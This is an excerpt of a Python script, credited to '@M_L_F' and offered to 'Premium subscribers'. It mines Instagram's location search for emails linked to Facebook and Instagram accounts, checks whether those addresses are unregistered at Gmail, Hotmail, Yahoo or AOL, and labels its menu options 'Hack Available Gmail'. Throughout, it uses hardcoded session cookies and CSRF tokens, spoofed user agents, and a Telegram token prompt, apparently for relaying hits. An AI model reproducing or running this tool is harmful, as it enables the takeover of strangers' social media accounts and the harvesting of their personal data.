...
print(J)
print(F+"_"*58)
Token = input(B+"ENTER YOUR TOKEN => "+Z)
IDd = input(B+"ENTER YOIR ID => "+Z)
system('clear')
...
DeV => @M_L_F'''
					...
					print(C+f"NOT AVILIBLE IN GMAIL => {emai}")
	def hot(Email,NaMe,POst,IDD,Link,adres,city):
			took = str(Token)
			iidd=str(IDd)
		...
		"Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}	
			html = get(url, data={''}, headers=headers).text
			if 'Neither' in html:
				print(X+f"AVAILABLE IN HOTMAIL ==> {Email}")
				alaa.face(Email,NaMe,POst,IDD,Link,took,iidd,adres,city)
			else:
				print(Z+f"NOT AVAILABLE IN HOTMAIL ==> {Email}")
...
'cookie':'mid=YvPaYAABAAG3pnL6OA7VEBlLVuDo; ig_did=47F0CEA6-3B69-4576-A88E-23F3CE15444E; ig_nrcb=1; datr=H9vzYq35j3WCu3W5Jw-BuqMb; csrftoken=70PY2h0BCb6TjUlRiKoxx1fLPoez7VUD; ds_user_id=10851247180; sessionid={}; dpr=1.75; shbid="2195,10851247180,1692646123:01f7f8918df9fa999fdb6a750fc9a05b8d62f092d1be0d0d23e936e8ff8e45ee9b251c1c"; shbts="1661110123,10851247180,1692646123:01f71c2e913918d6e1dcf270151c6aa61fcd6126fe257c741383603452a7a0c34c6bc57b"; rur="RVA,10851247180,1692646163:01f742b58e72de2b080b897a38e2768e875bb420bacf9a9cbd6c44a87a53bccf6207ad1a"'.format(sis),
...
'viewport-width':'412',
'x-asbd-id':'198387',
'x-csrftoken':'70PY2h0BCb6TjUlRiKoxx1fLPoez7VUD',
'x-ig-app-id':'1217981644879628',
'x-ig-www-claim':'hmac.AR16wNjyuckc0qk4ogcBIWjOuYHm4V6EFi8U2XCJriHI4HPN'}
		data = {'count': '12121212',
...
Dev :- @M_L_F''')
			...
			alaa.face(email,took,iidd)
			
	def f_gam(Email,NaMe,POst,IDD,Link,adres,city):
		iidd = str(IDd)
		took=str(Token)
	...
	def f_am(Email):
		...
		if ali.json()['status'] == 'SUCCESS':
			...
			print(Z+f"NOT AVAILABLE IN GMAIL ==> {Email}")
	def yaho(Email,NaMe,POst,IDD,Link,adres,city):
		took = str(Token)
		iidd = str(IDd)
		emal = Email
		rd= {
	...
	def Aol(Email,NaMe,POst,IDD,Link,adres,city):
		took=str(Token)
		iidd = str(IDd)
		email = str(Email)
		check = gdolib.check_email.aol(email)
...
O = f'''{F}_________ _______  _______  _______ 
\__   __/(  ____ )(  ___  )(  ___  )
   ) (   | (    )|| (   ) || (   ) |
   | |   | (____)|| (___) || |   | |
{Z}   | |   |     __)|  ___  || |   | |
...
def jalan(z):
    for e in z + '\n':
    	...
    	sys.stdout.flush()
    	sleep(0.03)
jalan(F+f'''Programmed By :- {Z}@M_L_F {X}•\n{F}The tool is only for {Z}Premium subscribers {X}•''')
def y():
	o = F+"-"*58
	t = Z+"-"*58
	bk = input(f"{o}\n    {Z}√ {F}    INSTAGRAM      {Z}√     \n{o}\n{Z}({F}1{Z}) {B}Extract {Z}following {B}from a specific user {X}•\n{Z}({F}2{Z}) {B}Hack Available {Z}Gmail {X}•\n{Z}({F}3{Z}) {Z}Delet Combo {X}•\n{Z}({F}4{Z}) {B}Login up for a Sessionid {X}•\n{Z}({F}5{Z}) {B}Extract {Z}followers {B}from a specific user {X}•\n{Z}({F}6{Z}) {Z}Search {B}For UserNames {X}• \n{Z}({F}7{Z}) {B}Hack Available {Z}Aol {B}And {Z}Gmail {X}•\n{o}\n    {Z}√ {F}    FACEBOOK      {Z}√     \n{o}\n{Z}({F}8{Z}){B} Check Auto {Z}FaceBook {B}Available {Z}Yahoo {X}•\n{Z}({F}9{Z}) {B}Check {Z}FaceBook From Name {B}Available {Z}Yahoo {X}•\n{Z}({F}10{Z}){B} Check Auto {Z}FaceBook {B}Available {Z}Gmail {X}•\n{Z}({F}11{Z}) {B}Check {Z}FaceBook From Name {B}Available {Z}Gmail {X}•\n{Z}({F}12{Z}){B} Check Auto {Z}FaceBook {B}Available {Z}Aol {X}•\n{Z}({F}13{Z}) {B}Check {Z}FaceBook From Name {B}Available {Z}Aol {X}•{B}\n{t}\n[{A}={B}] {B}Choose :- {Z}")
	print(F+"•"*60)
	if bk == '1':
		print("COMMING SooN...")
		exit()
	...
	if bk == '2':
		system('clear')
		Fil = input(B+f"Enter Name Combo Name => {B}")
		print(C+"="*58)
		try:
...
'sec-fetch-site':'same-site',
'user-agent':str(generate_user_agent())}
				req = get(f"https://i.instagram.com/api/v1/web/search/topsearch/?context=blended&query={get_full_name()}@yahoo.com&rank_token=0.6481600571666157&include_reel=true",headers=hd).json()['places']
				for i in req:
					adres = i['place']['location']['address']
					city = i['place']['location']['city']
					f = i['place']['location']['address']
					if 'https' in f or '°' in f or '-' in f or ' ' in f:
						pass
					elif '@yahoo.com' in f:
						Email = i['place']['location']['address'].split('.mx')[0].split('.au')[0].split('.ar')[0].split('.en')[0]
						NaMe = "Mame :- "+i['place']['location']['name']
						POst = "Posts :- "+str(i['position'])
						IDD = "ID :- "+i['place']['location']['pk']
						Link = "Link :- "+"https://m.facebook.com/"+i['place']['location']['pk']
						alaa.yaho(Email,NaMe,POst,IDD,Link,adres,city)
					else:
						pass
			except:
				print(A+f"The network is not working, waiting {X}•")
	...
	if bk == '10':
		system('clear')
		while True:
			DU = str(''.join(choice('asdfghjklpoiuytrewqzxcvbnm') for i in range(int(randint(1,7)))))+str(choice('1234567890') for i in range(int(randint(1,10))))
...
'sec-fetch-site':'same-site',
'user-agent':str(generate_user_agent())}
			req = get(f"https://i.instagram.com/api/v1/web/search/topsearch/?context=blended&query={DU}@gmail.com&rank_token=0.6481600571666157&include_reel=true",headers=hd).json()['places']
			for i in req:
				adres = i['place']['location']['address']
				city = i['place']['location']['city']
				f = i['place']['location']['address']
				if 'https' in f or '°' in f or '-' in f or ' ' in f:
					...
					IDD = "ID :- "+i['place']['location']['pk']
					Link = "Link :- "+"https://m.facebook.com/"+i['place']['location']['pk']
					alaa.f_gam(Email,NaMe,POst,IDD,Link,adres,city)
				else:
					pass
	if bk == '11':
		nam = input(B+f"Enter a Name To Guess {B}:- {Z}")
...
'sec-fetch-site':'same-site',
'user-agent':str(generate_user_agent())}
				req = get(f"https://i.instagram.com/api/v1/web/search/topsearch/?context=blended&query={get_full_name()}@aol.com&rank_token=0.6481600571666157&include_reel=true",headers=hd).json()['places']
				for i in req:
					adres = i['place']['location']['address']
					city = i['place']['location']['city']
					f = i['place']['location']['address']
					if 'https' in f or '°' in f or '-' in f or ' ' in f:
						...
						IDD = "ID :- "+i['place']['location']['pk']
						Link = "Link :- "+"https://m.facebook.com/"+i['place']['location']['pk']
						alaa.Aol(Email,NaMe,POst,IDD,Link,adres,city)
					else:
						pass
			except:
				print(A+f"The network is not working, waiting {X}•")
	if bk == '13':
		nam = input("Enter a Name To Guess {B}:- {Z}")
		system('clear')
		while True:
			try:
				u = str(randint(1,7))
